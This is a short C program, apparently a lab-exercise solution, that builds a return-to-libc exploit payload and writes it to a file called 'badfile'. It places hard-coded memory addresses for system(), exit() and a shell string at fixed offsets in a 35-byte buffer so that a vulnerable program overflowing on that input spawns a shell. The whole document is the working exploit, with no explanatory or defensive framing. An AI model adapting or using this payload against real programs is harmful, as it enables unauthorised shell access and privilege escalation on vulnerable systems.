#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
char buf[35];
FILE *badfile;
badfile = fopen("./badfile", "w");
*(int *)&buf[23] = 0xb7e5f430 ;//system()
*(int *)&buf[27] = 0xb7e52fb0 ;// exit()
*(int *)&buf[31] = 0xb7f80fb8 ;//"\bin\sh"
fwrite(buf, sizeof(buf),1, badfile);
fclose(badfile);
}

